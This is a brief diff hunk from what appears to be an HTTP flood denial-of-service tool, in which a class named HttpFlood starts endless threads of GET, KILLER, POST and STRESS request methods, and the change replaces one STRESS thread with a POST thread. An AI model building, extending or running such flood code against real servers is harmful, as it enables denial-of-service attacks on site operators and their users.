@@ -4635,7 +4635,7 @@ class HttpFlood(Thread):
         while True:
             Thread(target=self.GET, daemon=True).start()
             Thread(target=self.KILLER, daemon=True).start()
-            Thread(target=self.STRESS, daemon=True).start()
+            Thread(target=self.POST, daemon=True).start()
             Thread(target=self.STRESS, daemon=True).start()
 
     def GET(self) -> None:
